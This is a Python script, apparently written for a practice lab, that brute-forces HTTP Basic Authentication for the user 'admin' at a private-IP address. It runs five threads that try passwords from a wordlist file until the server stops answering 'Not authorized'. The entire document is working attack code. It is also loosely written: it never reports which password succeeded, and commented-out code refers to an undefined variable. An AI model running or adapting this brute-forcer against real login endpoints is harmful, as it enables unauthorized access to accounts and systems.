# -*- coding: utf-8 -*-
import requests
from requests.auth import HTTPBasicAuth
import queue
import threading
import sys

passwords = queue.Queue()



def test_pass(username, words):
	while not words.empty():
		# print(f"{words.get()}")
		try:
			resp = requests.get('http://10.0.1.15/authentication/example1/', auth=HTTPBasicAuth(username, words.get()))
		except requests.exceptions.ConnectionError:
			sys.stderr.write("x")
			sys.stderr.flush()
			continue

		if (resp.text.strip() != "Not authorized"):
			print(resp.status_code)
			return True
		else:
			print(resp.status_code)			
	return False

def get_words():

	words = queue.Queue()
	with open('passwd.txt',encoding='utf-8', mode='r') as f:
		raw_words = f.read()

	for w in raw_words.split():
		# w = w.strip()
		words.put(w)
	return words



	# if (test_pass('admin', w)):
	# 	print(f'[*] Found password : {p}')
	# 	break


if __name__ == '__main__':
	words = get_words()
	for _ in range(5):
		t = threading.Thread(target=test_pass, args=("admin",words,))
		t.start()